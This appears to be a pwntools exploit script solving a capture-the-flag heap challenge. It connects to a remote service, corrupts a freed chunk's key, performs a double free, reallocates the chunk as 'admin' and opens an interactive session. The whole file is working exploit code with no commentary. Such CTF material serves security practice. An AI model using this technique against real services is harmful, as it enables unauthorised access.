#!/usr/bin/env python3

from pwn import *

exe = ELF("./chhili_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("40.71.72.198", 1234)

def sl(a):
    r.sendlineafter(">> ", a)

def s(a):
    r.sendafter(">> ", a)

def malloc(size, data="MAHER"):
    sl("1")
    sl(str(size))

    if size < 0x80:
        s(data)

def free():
    sl("2")

def edit(data):
    sl("3")
    s(data)

def main():
    
    malloc(0x18, b"M"*0x18)
    free()

    # Corrupt key.
    edit(b"M"*9)

    malloc(0x1000)

    # double free
    free()

    malloc(0x18, "admin")

    sl("4")

    r.interactive()


if __name__ == "__main__":
    main()
